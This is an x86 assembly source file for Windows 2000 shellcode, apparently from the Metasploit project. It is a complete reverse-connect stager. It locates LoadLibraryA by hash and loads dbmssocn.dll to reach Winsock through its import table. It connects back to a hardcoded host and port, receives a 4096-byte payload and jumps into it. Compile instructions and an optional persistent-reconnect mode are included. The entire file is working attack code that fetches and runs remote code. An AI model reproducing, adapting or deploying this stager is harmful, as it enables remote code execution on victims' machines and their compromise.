;      Title:  Windows 2000 Vampiric Import Reverse Connect
;  Platforms:  Windows 2000
;   Function:  Attach to dbmssocn.dll, use IAT to connect, read/exec payload
;     Author:  hdm[at]metasploit.com

; Compile: nasm -f bin -o win2000_vampiric_connector.bin win2000_vampiric_connector.asm


[BITS 32]

%define ESIMOD add si, 0x3000
%define DBMSSOCN_WSAStartup [esi + 0x6C]
%define DBMSSOCN_connect    [esi + 0x4C]
%define DBMSSOCN_recv       [esi + 0x54]
%define DBMSSOCN_send       [esi + 0x5C]
%define DBMSSOCN_socket     [esi + 0x74]

; uncomment this for better error handling and persistent reconnects
; %define NICE

global _start
_start:

LKernel32Base:
    push byte 0x30
    pop ecx
    mov eax, [fs:ecx]
    mov eax, [eax + 0x0c]
    mov esi, [eax + 0x1c]
    lodsd
    mov ebp, [eax + 0x08]

    mov eax, [ebp + 0x3c]
    mov edx, [ebp + eax + 120]
    add edx, ebp
    mov ecx, [edx + 24]
    mov ebx, [edx + 32]
    add ebx, ebp

LFinderLoop:

%ifdef NICE
    jecxz LNotFound
%endif

    dec ecx
    mov esi, [ebx + ecx * 4]
    add esi, ebp
    xor edi, edi
    cld

LHasher:
    xor eax, eax
    lodsb
    cmp al, ah
    je short LFound
    ror edi, 13
    add edi, eax
    jmp short LHasher

LFound:
    cmp edi, 0xec0e4e8e     ; LoadLibraryA
    jnz short LFinderLoop
    mov ebx, [edx + 36]
    add ebx, ebp
    mov cx, [ebx + 2 * ecx]
    mov ebx, [edx + 28]
    add ebx, ebp
    mov eax, [ebx + 4 * ecx]
    add eax, ebp
    jmp short LFinderDone

%ifdef NICE
LNotFound:
    xor eax, eax
%endif

LFinderDone:
    call LoadDBMSSOCN

LDataSegment:
;========================
db "DBMSSOCN.DLL"
db 0x00, 0xFF               ; second byte only added for easy disasm
;========================

LoadDBMSSOCN:
	call eax                ; LoadLibraryA (ptr to dll on stack)
    mov esi, eax            ; esi used by all DBMSSOCN functions
    ESIMOD                  ; inc base to save space on the calls
    xor edi, edi            ; edi is just a null

LWSAStartup:
    sub sp, 400
	push esp
	push dword 0x101
	call DBMSSOCN_WSAStartup

LSocket:
	push edi
	push edi
	push edi
	push edi
	inc edi
	push edi
	inc edi
	push edi
	call DBMSSOCN_socket
	mov ebx, eax

LConnect:
    push 0xF700A8C0         ; host: 192.168.0.247
    push 0x11220002         ; port: 8721
	mov ecx, esp
	push byte 0x10
	push ecx
	push ebx
	call DBMSSOCN_connect   ; set eax to 0 on success

%ifdef NICE
    test eax,eax
    jnz LConnect
    xor eax, eax
%endif

LReadCodeFromSocket:
    add di, 0xffe            ; read 4096 bytes of payload (edi == 2)
    sub esp, edi
    mov ebp, esp
    push eax               ; flags
    push edi               ; length
    push ebp               ; buffer
    push ebx               ; socket
    call DBMSSOCN_recv     ; recv(socket, buffer, length, flags)
    jmp esp                ; jump into new payload